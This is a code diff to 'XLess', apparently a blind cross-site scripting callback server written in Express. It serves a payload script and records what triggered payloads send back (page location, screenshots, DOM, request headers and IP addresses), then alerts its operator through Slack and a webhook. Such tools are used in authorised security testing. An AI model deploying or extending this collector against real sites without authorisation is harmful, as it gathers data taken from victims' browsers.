@@ -188,7 +188,7 @@ app.all("/message", (req, res) => {
   var message = req.query.text || req.body.text
   const alert = generate_message_alert(message)
   data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
-  Hook.success("WXLess",alert)
+  Hook.success("XLess",alert)
   request.post(process.env.SLACK_INCOMING_WEBHOOK, data, (out)  => {
     
     res.send("ok\n")
@@ -251,6 +251,7 @@ async function emailsend(username, password, receiver, content){
 
 app.post("/c", async (req, res) => {
   let data = req.body
+  
   // Upload our screenshot and only then send the Slack alert
   data["Screenshot URL"] = ""
   if (imgbb_api_key && data["Screenshot"]) {
@@ -270,6 +271,7 @@ app.post("/c", async (req, res) => {
     }
   }
 
+  Hook.success("XLess", "Blind XSS Payload has been triggered from "+data["Location"]+" ( "+data["Screenshot URL"]+" ). Please check email and slack notification for more details.")
 
  data["HTML Data"] = ""
  if(data["DOM"].length >= 2500){
@@ -351,19 +353,27 @@ app.get("/health", async (req, res) => {
     res.end()
 })
 
-app.all("/1337/*", (req, res) => {
+app.all("/x/*", (req, res) => {
+  var headers = req.headers
+  var data = req.body
+  var raw = req.rawBody
+  data["Remote IP"] = req.headers["x-forwarded-for"] || req.socket.remoteAddress
+  const alert = generate_callback_alert(req, headers, data, raw, req.url)
+  Hook.success("XLess",alert)
+  res.sendFile(path.join(__dirname + '/payload.js'))
+})
+
+app.all("/*", (req, res) => {
   var headers = req.headers
   var data = req.body
   var raw = req.rawBody
   data["Remote IP"] = req.headers["x-forwarded-for"] || req.socket.remoteAddress
   const alert = generate_callback_alert(req, headers, data, raw, req.url)
   data = {form: {"payload": JSON.stringify({"username": "XLess", "mrkdwn": true, "text": alert}) }}
-
   request.post(slack_incoming_webhook, data, (out)  => {
     res.sendFile(path.join(__dirname + '/payload.js'))
   });
 })
-
 
 app.listen(port, err => {
     if (err) throw err
